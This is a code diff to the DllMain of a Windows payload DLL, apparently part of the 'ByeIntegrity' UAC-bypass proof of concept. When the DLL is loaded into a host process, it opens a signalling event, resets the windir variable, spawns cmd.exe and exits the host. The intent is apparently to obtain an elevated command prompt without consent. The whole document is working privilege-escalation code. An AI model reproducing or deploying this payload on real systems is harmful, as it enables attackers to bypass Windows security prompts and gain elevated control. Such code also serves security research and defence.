@@ -17,64 +17,76 @@ PWSTR PaConcatString(
 	return data;
 }
 
-__declspec(noreturn)
-void WINAPI DllMain(
+BOOL WINAPI DllMain(
 	HINSTANCE hInstance,
 	DWORD reason,
 	LPVOID reserved
 )
 {
 	UNREFERENCED_PARAMETER(hInstance);
-	UNREFERENCED_PARAMETER(reason);
 	UNREFERENCED_PARAMETER(reserved);
 
-	PWSTR winDir, system32 = NULL;
-	HRESULT hr;
-	UINT exitCode;
-	PWSTR cmdPath = NULL;
-	STARTUPINFOW si;
-	PROCESS_INFORMATION pi;
+	if (reason == DLL_PROCESS_ATTACH)
+	{
+		PWSTR winDir = NULL, system32 = NULL;
+		HRESULT hr;
+		UINT exitCode;
+		PWSTR cmdPath = NULL;
+		STARTUPINFOW si;
+		PROCESS_INFORMATION pi;
+		HANDLE hEvent;
 
-	hr = SHGetKnownFolderPath(&FOLDERID_Windows, 0, NULL, &winDir);
-	if (!SUCCEEDED(hr)) {
-		exitCode = (UINT)hr;
-		goto eof;
-	}
-	hr = SHGetKnownFolderPath(&FOLDERID_System, 0, NULL, &system32);
-	if (!SUCCEEDED(hr)) {
-		exitCode = (UINT)hr;
-		goto eof;
-	}
+		hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"ByeIntegrity8");
+		if (!hEvent) {
+			exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
+			goto eof;
+		}
 
-	cmdPath = PaConcatString(system32, L"\\cmd.exe");
-	if (!cmdPath) {
-		exitCode = (UINT)HRESULT_FROM_WIN32(ERROR_OUTOFMEMORY);
-		goto eof;
-	}
+		hr = SHGetKnownFolderPath(&FOLDERID_Windows, 0, NULL, &winDir);
+		if (!SUCCEEDED(hr)) {
+			exitCode = (UINT)hr;
+			goto eof;
+		}
+		hr = SHGetKnownFolderPath(&FOLDERID_System, 0, NULL, &system32);
+		if (!SUCCEEDED(hr)) {
+			exitCode = (UINT)hr;
+			goto eof;
+		}
 
-	if (!SetEnvironmentVariableW(L"windir", winDir)) {
-		exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
-		goto eof;
-	}
+		cmdPath = PaConcatString(system32, L"\\cmd.exe");
+		if (!cmdPath) {
+			exitCode = (UINT)HRESULT_FROM_WIN32(ERROR_OUTOFMEMORY);
+			goto eof;
+		}
 
-	ZeroMemory(&si, sizeof(STARTUPINFOW));
-	si.cb = sizeof(STARTUPINFOW);
-	if (!CreateProcessW(cmdPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-		exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
-		goto eof;
-	}
+		if (!SetEnvironmentVariableW(L"windir", winDir)) {
+			exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
+			goto eof;
+		}
 
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
+		ZeroMemory(&si, sizeof(STARTUPINFOW));
+		si.cb = sizeof(STARTUPINFOW);
+		if (!CreateProcessW(cmdPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+			exitCode = (UINT)HRESULT_FROM_WIN32(GetLastError());
+			goto eof;
+		}
 
-	exitCode = 0xDEADBEEF;
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+
+		exitCode = 0;
+		SetEvent(hEvent);
 
 eof:
-	if (winDir)
-		CoTaskMemFree(winDir);
-	if (system32)
-		CoTaskMemFree(system32);
-	if (cmdPath)
-		HeapFree(GetProcessHeap(), 0, cmdPath);
-	ExitProcess(exitCode);
+		if (hEvent)
+			CloseHandle(hEvent);
+		if (winDir)
+			CoTaskMemFree(winDir);
+		if (system32)
+			CoTaskMemFree(system32);
+		if (cmdPath)
+			HeapFree(GetProcessHeap(), 0, cmdPath);
+		ExitProcess(exitCode);
+	}
+	return TRUE;
 }
